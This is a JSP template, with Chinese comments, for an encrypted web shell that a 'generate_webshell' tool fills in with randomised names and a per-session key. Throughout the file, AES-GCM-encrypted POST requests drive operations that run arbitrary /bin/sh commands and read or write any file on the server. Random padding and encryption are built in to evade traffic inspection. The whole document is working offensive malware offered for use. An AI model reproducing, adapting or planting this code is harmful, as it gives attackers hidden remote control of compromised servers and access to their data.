<%@ page contentType="text/plain" import="java.util.*,java.io.*,java.security.SecureRandom,javax.crypto.Cipher,javax.crypto.spec.GCMParameterSpec,javax.crypto.spec.SecretKeySpec" %><%!
// ARTEX 加密马 (jspenc) —— 自研 implant,协议与 phpenc 模板头部注释同构:
//   body = base64( nonce(12B) || ciphertext || tag(16B) ),仅 AES-256-GCM
//   (javax.crypto AES/GCM/NoPadding,Java 8+ 均支持,无降级路径);
//   明文帧 = padLen(1B) || 随机填充(0~64B) || JSON;字段值恒为 base64/hex/枚举。
// 本文件由 generate_webshell 生成:密钥每会话独立随机,方法/变量名每份随机化。
private static final String {{.FK}} = "{{.KeyB64}}";

// 解密一帧:tag 不符由 GCM 抛 AEADBadTagException(调用方 catch,不回显明文)。
private static byte[] {{.FDec}}(byte[] k, byte[] raw) throws Exception {
    byte[] iv = Arrays.copyOfRange(raw, 0, 12);
    byte[] ct = Arrays.copyOfRange(raw, 12, raw.length);
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, iv));
    return c.doFinal(ct);
}

// 加密一帧:nonce 每帧 SecureRandom。
private static byte[] {{.FEnc}}(byte[] k, byte[] pt) throws Exception {
    byte[] iv = new byte[12];
    new SecureRandom().nextBytes(iv);
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, iv));
    byte[] ct = c.doFinal(pt);
    byte[] out = new byte[12 + ct.length];
    System.arraycopy(iv, 0, out, 0, 12);
    System.arraycopy(ct, 0, out, 12, ct.length);
    return out;
}

// 明文帧:长度字节 + 随机填充 + 载荷。
private static byte[] {{.FFrame}}(byte[] p) {
    SecureRandom r = new SecureRandom();
    int n = r.nextInt(65);
    byte[] f = new byte[1 + n + p.length];
    r.nextBytes(f); // 先整体填随机(填充区),再覆盖长度字节与载荷区
    f[0] = (byte) n;
    System.arraycopy(p, 0, f, 1 + n, p.length);
    return f;
}
private static byte[] {{.FUnframe}}(byte[] f) {
    int n = f[0] & 0xff;
    return Arrays.copyOfRange(f, 1 + n, f.length);
}

// 朴素 JSON 字段提取:协议保证字段值恒为 base64/hex/枚举(无引号/反斜杠),
// 因此不依赖任何 JSON 库即可安全截取。
private static String {{.FG}}(String j, String k) {
    String p = "\"" + k + "\":\"";
    int i = j.indexOf(p);
    if (i < 0) { return ""; }
    int s = i + p.length();
    int e = j.indexOf('"', s);
    return e < 0 ? "" : j.substring(s, e);
}

// 读全部请求体(裸 POST body)。
private static String {{.FBody}}(javax.servlet.http.HttpServletRequest req) throws Exception {
    StringBuilder sb = new StringBuilder();
    BufferedReader br = req.getReader();
    String line;
    while ((line = br.readLine()) != null) { sb.append(line); }
    return sb.toString().trim();
}
<%
String {{.VMode}} = "gcm";
String {{.VOut}} = "";
String {{.VErr}} = "";
boolean {{.VOk}} = false;
byte[] {{.VKey}} = Base64.getDecoder().decode({{.FK}});
try {
    byte[] {{.VRaw}} = {{.FDec}}({{.VKey}}, Base64.getDecoder().decode({{.FBody}}(request)));
    String {{.VJson}} = new String({{.FUnframe}}({{.VRaw}}), "UTF-8");
    String {{.VOp}} = {{.FG}}({{.VJson}}, "op");
    if ({{.VOp}}.equals("probe")) {
        {{.VOk}} = true;
        {{.VOut}} = {{.FG}}({{.VJson}}, "s");
    } else if ({{.VOp}}.equals("exec")) {
        // 主通道:sh -c 执行命令(与期 1a JSP 马同一执行面,stderr 合并进 stdout)。
        String {{.VCode}} = new String(Base64.getDecoder().decode({{.FG}}({{.VJson}}, "code")), "UTF-8");
        Process {{.VP}} = new ProcessBuilder("/bin/sh", "-c", {{.VCode}}).redirectErrorStream(true).start();
        ByteArrayOutputStream {{.VB}} = new ByteArrayOutputStream();
        InputStream {{.VI}} = {{.VP}}.getInputStream();
        byte[] {{.VBuf}} = new byte[8192];
        int {{.VN}};
        while (({{.VN}} = {{.VI}}.read({{.VBuf}})) > 0) { {{.VB}}.write({{.VBuf}}, 0, {{.VN}}); }
        {{.VP}}.waitFor();
        {{.VOk}} = true;
        {{.VOut}} = Base64.getEncoder().encodeToString({{.VB}}.toByteArray());
    } else if ({{.VOp}}.equals("read")) {
        // 原生整文件读(兜底通道;主通道分块读由驱动经 exec 的 dd/base64 构造)。
        File {{.VF}} = new File(new String(Base64.getDecoder().decode({{.FG}}({{.VJson}}, "path")), "UTF-8"));
        FileInputStream {{.VFI}} = new FileInputStream({{.VF}});
        ByteArrayOutputStream {{.VB}} = new ByteArrayOutputStream();
        byte[] {{.VBuf}} = new byte[8192];
        int {{.VN}};
        while (({{.VN}} = {{.VFI}}.read({{.VBuf}})) > 0) { {{.VB}}.write({{.VBuf}}, 0, {{.VN}}); }
        {{.VFI}}.close();
        {{.VOk}} = true;
        {{.VOut}} = Base64.getEncoder().encodeToString({{.VB}}.toByteArray());
    } else if ({{.VOp}}.equals("write")) {
        // 原生写(兜底通道;app=1 追加)。
        File {{.VF}} = new File(new String(Base64.getDecoder().decode({{.FG}}({{.VJson}}, "path")), "UTF-8"));
        byte[] {{.VData}} = Base64.getDecoder().decode({{.FG}}({{.VJson}}, "data"));
        FileOutputStream {{.VFO}} = new FileOutputStream({{.VF}}, {{.FG}}({{.VJson}}, "app").equals("1"));
        {{.VFO}}.write({{.VData}});
        {{.VFO}}.close();
        {{.VOk}} = true;
    } else {
        {{.VErr}} = "unknown op";
    }
} catch (Exception {{.VT}}) {
    // 含解密/tag 失败:不回显任何明文细节,错误类名经加密帧返回。
    {{.VErr}} = {{.VT}}.getClass().getSimpleName();
}
String {{.VResp}} = "{\"ok\":" + {{.VOk}} + ",\"out\":\"" + {{.VOut}} + "\",\"err\":\"" + {{.VErr}} + "\",\"mode\":\"" + {{.VMode}} + "\"";
out.print(Base64.getEncoder().encodeToString({{.FEnc}}({{.VKey}}, {{.FFrame}}({{.VResp}}.getBytes("UTF-8")))));
%>
